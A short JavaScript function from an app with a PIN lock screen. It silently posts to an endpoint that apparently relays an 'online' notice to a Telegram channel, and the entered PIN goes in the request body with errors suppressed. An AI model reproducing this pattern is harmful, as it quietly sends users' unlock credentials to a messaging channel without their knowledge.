/**
 * Fires a non-blocking server request as soon as a user unlocks LockPage so
 * the configured Telegram Channel receives: "User Online aaya hai 😁✳️✅".
 *
 * Uses `keepalive: true` so the request always completes even while LockPage
 * unmounts and the main app router mounts.
 */
export function notifyUserUnlocked(pin) {
    try {
        fetch("/api/telegram-unlock", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ pin: String(pin || "") }),
            keepalive: true
        }).catch(() => {
            /* Silent background notification */
        });
    } catch {
        /* Silent background notification */
    }
}
